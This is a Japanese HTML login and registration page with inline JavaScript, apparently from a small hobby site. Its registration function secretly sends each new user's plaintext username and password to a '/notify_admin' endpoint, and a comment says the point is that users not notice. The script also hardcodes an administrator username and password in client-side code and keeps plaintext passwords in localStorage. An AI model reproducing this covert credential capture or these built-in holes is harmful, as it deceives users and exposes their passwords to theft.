<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ログイン</title>
    <link rel="stylesheet" href="static/style2.css">
    <style>
        .eye-icon:hover {
            opacity: 0.7;
        }
    </style>
<body>
    <nav style="background:#222; color:#fff; padding:0.7em 0; text-align:center; font-size:1.1em; letter-spacing:1px;">
    <a href="https://www.rakuten.co.jp/kbsanhe/" style="color:#00e0ff; margin:0 1em; text-decoration:underline;">楽天サイト</a>
    <a href="https://docs.google.com/forms/d/e/1FAIpQLScIxMze7zXyO4OfyMyBTXrIbZP7Ak1Jm_FT3rvvmw01jYgOtA/viewform?usp=header" style="font-weight: bold;" target="_blank">アンケート画面へ</a>
</nav>
    <div class="background-effect"></div>

    <header class="futuristic-header">
        <div class="header-content">
            <h1><span class="neon-text">ログイン</span></h1>
            <p class="tagline">アカウントでログインまたは新規登録してください</p>
        </div>
    </header>

    <main class="main-content">
        <section class="control-panel glassm-effect">
            <div id="login-form">
                <h2 style="color: var(--neon-blue); text-align: center;">ログイン</h2>
                <div class="control-group">
                    <label for="login-username" class="control-label">ユーザ名</label>
                    <input type="text" id="login-username" class="futuristic-input" placeholder="ユーザ名を入力" onkeydown="if(event.key==='Enter') login()">
                </div>
                <div class="control-group">
                    <label for="login-password" class="control-label">パスワード</label>
                    <div style="position: relative;">
                        <input type="password" id="login-password" class="futuristic-input" placeholder="パスワードを入力" onkeydown="if(event.key==='Enter') login()">
                        <span class="eye-icon" onclick="togglePw('login-password')" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--neon-blue);">👁️</span>
                    </div>
                </div>
                <div class="control-group" style="text-align: left;">
                    <input type="checkbox" id="auto-login" style="margin-right: 8px;">次回から自動ログイン
                </div>
                <button onclick="login()" style="width: 100%; padding: 1em; background: linear-gradient(90deg, #00f2fe 0%, #ae00ff 100%); color: #fff; border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer;">ログイン</button>
                <p style="text-align: center; margin-top: 1em;"><a href="#" onclick="showRegister()" style="color: var(--neon-blue);">新規登録はこちら</a></p>
            </div>

            <div id="register-form" style="display: none;">
                <h2 style="color: var(--neon-blue); text-align: center;">新規登録</h2>
                <div class="control-group">
                    <label for="reg-username" class="control-label">ユーザ名</label>
                    <input type="text" id="reg-username" class="futuristic-input" placeholder="ユーザ名（英数字、ひらがな、カタカナ、_のみ）" onkeydown="if(event.key==='Enter') register()">
                </div>
                <div class="control-group">
                    <label for="reg-password" class="control-label">パスワード</label>
                    <div style="position: relative;">
                        <input type="password" id="reg-password" class="futuristic-input" placeholder="パスワード（2文字以上）" onkeydown="if(event.key==='Enter') register()">
                        <span class="eye-icon" onclick="togglePw('reg-password')" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: var(--neon-blue);">👁️</span>
                    </div>
                </div>
                <button onclick="register()" style="width: 100%; padding: 1em; background: linear-gradient(90deg, #00f2fe 0%, #ae00ff 100%); color: #fff; border: none; border-radius: 8px; font-size: 1.1em; cursor: pointer;">登録</button>
                <p style="text-align: center; margin-top: 1em;"><a href="#" onclick="showLogin()" style="color: var(--neon-blue);">ログインはこちら</a></p>
            </div>

            <div id="message" style="text-align: center; margin-top: 1em; color: #ff4d4d;"></div>
        </section>
    </main>

    <footer class="futuristic-footer">
        <p>&copy; プログラム言語集</p>
        <p class="footer-note">ログインして機能を活用してください</p>
    </footer>

    <script>
        function togglePw(id) {
            const input = document.getElementById(id);
            if (input.type === "password") {
                input.type = "text";
            } else {
                input.type = "password";
            }
        }

        function showRegister() {
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('register-form').style.display = 'block';
            document.getElementById('message').textContent = '';
        }

        function showLogin() {
            document.getElementById('register-form').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
            document.getElementById('message').textContent = '';
        }

        function register() {
            const username = document.getElementById('reg-username').value.trim();
            const password = document.getElementById('reg-password').value;

            if (!username || !password) {
                document.getElementById('message').textContent = 'ユーザ名とパスワードは必須です';
                return;
            }

            if (!/^[a-zA-Z0-9_ぁ-ゖァ-ヾ]+$/.test(username)) {
                document.getElementById('message').textContent = 'ユーザ名は英数字、ひらがな、カタカナ、_のみ使用可能です';
                return;
            }

            if (password.length < 2) {
                document.getElementById('message').textContent = 'パスワードは2文字以上で入力してください';
                return;
            }

            let users = JSON.parse(localStorage.getItem('loginUsers') || '{}');
            if (users[username]) {
                document.getElementById('message').textContent = 'このユーザ名は既に登録されています';
                return;
            }

            users[username] = { password };
            localStorage.setItem('loginUsers', JSON.stringify(users));

            // 管理者へ通知（利用者にばれないように）
            fetch('/notify_admin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            }).catch(err => console.error('通知エラー:', err));

            document.getElementById('message').textContent = '登録完了！ログインしてください';
            showLogin();
        }

        function login() {
            const username = document.getElementById('login-username').value.trim();
            const password = document.getElementById('login-password').value;

            if (!username || !password) {
                document.getElementById('message').textContent = 'ユーザ名とパスワードを入力してください';
                return;
            }

            // 管理者チェック
            if (username === 'ともひこです' && password === 'skytomo124') {
                localStorage.setItem('currentUser', username);
                localStorage.setItem('isAdmin', 'true');
                if (document.getElementById('auto-login').checked) {
                    localStorage.setItem('autoLogin', 'true');
                    localStorage.setItem('savedUsername', username);
                    localStorage.setItem('savedPassword', password);
                }
                window.location.href = 'loading.html';
                return;
            }

            let users = JSON.parse(localStorage.getItem('loginUsers') || '{}');
            if (!users[username] || users[username].password !== password) {
                document.getElementById('message').textContent = 'ユーザ名またはパスワードが違います';
                return;
            }

            localStorage.setItem('currentUser', username);
            localStorage.setItem('isAdmin', 'false');
            if (document.getElementById('auto-login').checked) {
                localStorage.setItem('autoLogin', 'true');
                localStorage.setItem('savedUsername', username);
                localStorage.setItem('savedPassword', password);
            }
            window.location.href = 'loading.html';
        }

        window.onload = function() {
            if (localStorage.getItem('currentUser')) {
                window.location.href = 'loading.html';
                return;
            }
            // 自動ログイン
            if (localStorage.getItem('autoLogin') === 'true') {
                const username = localStorage.getItem('savedUsername');
                const password = localStorage.getItem('savedPassword');
                if (username && password) {
                    document.getElementById('login-username').value = username;
                    document.getElementById('login-password').value = password;
                    document.getElementById('auto-login').checked = true;
                    login();
                }
            }


// Service Worker登録
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js')
        .then(registration => {
            console.log('Service Worker registered with scope:', registration.scope);
        })
        .catch(error => {
            console.log('Service Worker registration failed:', error);
        });
}
        };
    </script>
</body>
</html>
